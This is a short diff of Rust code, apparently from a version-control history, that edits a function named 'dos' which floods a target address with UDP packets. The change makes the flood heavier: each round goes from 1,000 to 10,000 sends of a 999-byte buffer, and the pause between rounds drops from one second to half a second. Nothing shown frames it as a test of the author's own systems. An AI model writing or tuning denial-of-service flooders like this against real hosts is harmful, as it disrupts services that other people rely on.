@@ -13,11 +13,11 @@ fn dos(addr_string: String) -> std::io::Result<()> {
     let buf = [5; 999];
 
     for i in 0..1_000 {
-        for _ in 0..1_000 {
+        for _ in 0..10_000 {
             socket.send_to(&buf, &addr)?;
         }
         println!("sent pktno={}", i);
-        std::thread::sleep(std::time::Duration::from_millis(1_000));
+        std::thread::sleep(std::time::Duration::from_millis(500));
     }
 
     Ok(())
